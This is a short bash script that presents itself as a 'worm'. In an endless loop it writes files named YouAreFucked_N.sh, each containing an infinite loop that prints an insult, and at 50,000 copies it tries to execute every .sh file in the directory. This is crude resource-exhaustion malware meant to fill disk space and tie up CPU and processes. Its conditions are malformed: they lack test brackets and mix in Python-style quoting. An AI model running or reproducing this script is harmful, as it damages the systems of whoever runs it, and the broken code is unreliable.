#!/bin/bash


context="""
while :
  do
    echo 'YOU ARE FUCKED'
  done
"""

Num=1

while :
  do
    echo "$context" > YouAreFucked_$Num.sh
    Num=$(( $Num+1 ))

    if $Num -eq 50000
    then
      for wormed in $(pwd)/*.sh
        do
          if  $wormed != worm
          then
            bash $wormed
          fi
        done
    fi
  done
